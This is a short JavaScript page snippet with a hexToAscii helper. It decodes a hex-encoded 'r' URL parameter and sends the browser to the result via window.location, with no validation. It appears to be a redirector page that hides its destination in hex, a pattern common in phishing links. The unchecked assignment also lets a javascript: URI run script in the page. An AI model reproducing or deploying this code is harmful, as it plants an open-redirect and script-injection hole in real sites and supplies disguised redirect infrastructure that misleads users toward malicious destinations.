<script>
  /**
 * Converts a hexadecimal string to ASCII text.
 * @param {string} hex - The hexadecimal string (e.g., "48656c6c6f").
 * @returns {string} - The corresponding ASCII string.
 */
function hexToAscii(hex) {
    if (typeof hex !== 'string') {
        throw new TypeError("Input must be a string.");
    }

    hex = hex.trim();

    if (hex.length % 2 !== 0) {
        throw new Error("Hex string must have an even number of characters.");
    }

    let ascii = '';
    for (let i = 0; i < hex.length; i += 2) {
        const hexPair = hex.substr(i, 2);
        const charCode = parseInt(hexPair, 16);
        if (isNaN(charCode)) {
            throw new Error(`Invalid hex character: ${hexPair}`);
        }
        ascii += String.fromCharCode(charCode);
    }
    return ascii;
};
  const urlParams = new URLSearchParams(window.location.search);
  const red = urlParams.get('r');
  var gg = hexToAscii(red);
  window.location = gg;
</script>
